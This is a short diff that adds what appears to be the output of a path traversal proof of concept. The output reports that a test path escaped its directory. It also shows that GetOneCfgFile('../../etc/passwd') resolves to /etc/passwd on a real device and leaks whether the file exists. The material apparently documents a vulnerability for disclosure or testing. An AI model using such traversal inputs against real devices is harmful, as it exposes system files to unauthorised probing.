@@ -1,0 +1,8 @@
+=== Path Traversal PoC ===
+
+Constructed path: /tmp/cfg_traverse_test/system/../secret.txt
+access(F_OK): SUCCESS — file found via traversal!
+
+On a real device:
+  GetOneCfgFile("../../etc/passwd") -> "/system/../../etc/passwd"
+  -> resolves to /etc/passwd -> file existence leaked
